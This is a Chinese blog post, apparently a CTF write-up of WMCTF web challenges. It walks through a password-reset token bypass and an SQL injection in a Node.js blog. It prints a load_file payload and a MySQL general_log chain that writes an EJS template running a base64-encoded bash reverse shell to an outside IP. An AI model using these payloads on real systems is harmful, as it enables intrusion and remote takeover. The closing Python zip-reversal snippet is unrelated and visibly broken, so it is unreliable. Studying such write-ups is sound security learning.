---
layout: post
title: WMCTF中其他的题目
categories: [blog ]
tags: [Java,]
description: "当时禁了非常多的类"
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: https://github.com/
 

---

![](/img/swirl/11.jpg)

# WMCTF



## 你的权限放我来

![image-20230820170743457](..\img\final\image-20230820170743457.png)

注册登陆后看到其他用户，可以猜想到这是一个数据库

#### 网页功能

用户登陆

用户注册

密码重置

登陆界面回显	

![image-20230820202007118](..\img\final\image-20230820202007118.png)

![image-20230820202741171](..\img\final\image-20230820202741171.png)

![image-20230820202729437](..\img\final\image-20230820202729437.png)

发现直接发送到我的邮箱了

![image-20230820230613247](..\img\final\image-20230820230613247.png)

本来想改密码直接换这个邮箱的毕竟题目源码有几个可疑的，但是发现token会进行校验

### 自己差的地方

都想到更改邮箱了，md直接把token删了呀，然后换上源码的邮箱，就可以更改指定邮箱的密码，然后登陆即可（一个个邮箱试）



## ezblog

当时看这道题得时候发现源码太多了，没耐心看下去，出了wp（来分析分析）

```javascript
app.get("/post/:id/edit", async (req, res) => {
    try {
        // parseInt的性能问题 https://dev.to/darkmavis1980/you-should-stop-using-parseint-nbf
        let id = req.params.id;
        if (!/\d+/igm.test(id) || /into|outfile|dumpfile/igm.test(id)) { // 判断 id是否是纯数字
            res.status(400).send(`Error: '${id}' is invalid id`);
            return;
        }
        // id只能为数字，可以安全的转为number，避免parseInt降低性能
        let post = await (0, posts_1.getPostById)(id);
        res.render("edit", {
            post
        });
    }
    catch (e) {
        res.status(500).send(e);
    }
});
```

/\d+/igm.test(id)这里得校验是字符中含有数字就可以,然后调用posts_1.getPostById，拼接可能造成sql注入

```javascript
function getPostById(id) {
    return new Promise((resolve, reject) => {
        // 使用 number 类型的 id 不会导致 sql 注入，因为数字类型只有0-9的数字，无法构造sql语句
        // TypeScript可以确保传入类型只能为number，不能为字符串，如果为字符串，将会发生编译时错误导致tsc无法编译，所以是安全的
        db_1.connection.query(`select * from Posts where id = ` + id, (err, results) => {
            if (err) {
                reject(err);
            }
            else {
                if (results.length === 0) {
                    reject(new Error("Post not found"));
                }
                else {
                    resolve({
                        id: results[0].id,
                        title: results[0].title,
                        content: results[0].content
                    });
                }
            }
        });
    });
}
```

![image-20230822163807965](..\img\final\image-20230822163807965.png)

发现出现了sql注入报错，说明存在sql这时候![image-20230822163856426](..\img\final\image-20230822163856426.png)

然后我们需要获得ping码，![image-20230822164110854](..\img\final\image-20230822164110854.png)

然后看✌们wp说是从   发现主程序启动的日志在`/home/ezblog/.pm2/logs/main-out.log`中

#### 解决方法

```
根据源码搭建一个docker（这里本地尝试使用dockercompose直接起得，但是起不来）
呃呃呃最后用了lxxx✌得docker
然后需要找启动得日志嘛
find / -name "logs" -type d   全局搜索logs日志文件夹
其实通过看dockerfile文件，能看的差不多
```

![image-20230822172053413](..\img\final\image-20230822172053413.png)

```
但是找了一圈没找到很疑惑

/post/-1%20union%20select%201,2,load_file(0x2f686f6d652f657a626c6f672f2e706d322f6c6f67732f6d61696e2d6f75742e6c6f67)/edit
```

![image-20230822165130652](..\img\final\image-20230822165130652.png)

![image-20230822172203881](..\img\final\image-20230822172203881.png)

然后就可以直接访问/console输入pin码

![image-20230822172243408](..\img\final\image-20230822172243408.png)

然后到了这个界面（如果说上面的拼死命可能做出，但是后面卧槽我是真不行）

#### General_log详解

1、介绍

开启general log将所有到达MySQL Server的SQL语句记录下来

show variables like 'general_log'; -- 查看日志是否开启

set global general_log=on; -- 开启日志功能

show variables like 'general_log_file'; -- 看看日志文件保存位置

set global general_log_file='tmp/general.lg'; -- 设置日志文件保存位置

show variables like 'log_output'; -- 看看日志输出类型 table或file

set global log_output='table'; -- 设置输出类型为 table

set global log_output='file'; -- 设置输出类型为file



#### 回归题目

​	先拿着佬的wp进行一波分析

```java
    CREATE DATABASE mysql;
    CREATE TABLE mysql.general_log(
      event_time timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
      user_host mediumtext NOT NULL,
      thread_id int(11) NOT NULL,
      server_id int(10) unsigned NOT NULL,
      command_type varchar(64) NOT NULL,
      argument mediumtext NOT NULL
    ) ENGINE=CSV DEFAULT CHARSET=utf8 COMMENT='General log';
    SET GLOBAL general_log_file='/home/ezblog/views/post.ejs';
    SET GLOBAL general_log='on';
    SELECT "<% global.process.mainModule.require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDIuMjI0LjU3LzQ0NDQgMD4mMQ==}|base64 -d|bash'); %>";
```

![image-20230822221718926](..\img\final\image-20230822221718926.png)

![image-20230822223223891](..\img\final\image-20230822223223891.png)

理想状态是在中间建立表，然后下面渲染模板，用的是docker中的绝对路径（但是却没成功）不知道自己操作哪里错了。







```
f=open("C:\Users\c'x'k\Desktop\misctool\3.zip","rb")#这样读取的内容是二进制的
hex_list=["{:02X}".format(c) for c in f.read()]  #这里的{:02x}是把后面二进制转换为 2位的16进制，不足则补0
hex_str=''.join(hex_list)
reversed_hex_str=hex_str[::-1]
reversed_bytes=bytes.fromhex(reversed_hex_str) #将反转后的16进制字符串转换为字节流
with open('Reverse_reversed.zip','wb') as f:  #打开一个新的二进制文件，将反转后的字节流写入其中
    f.write()
```

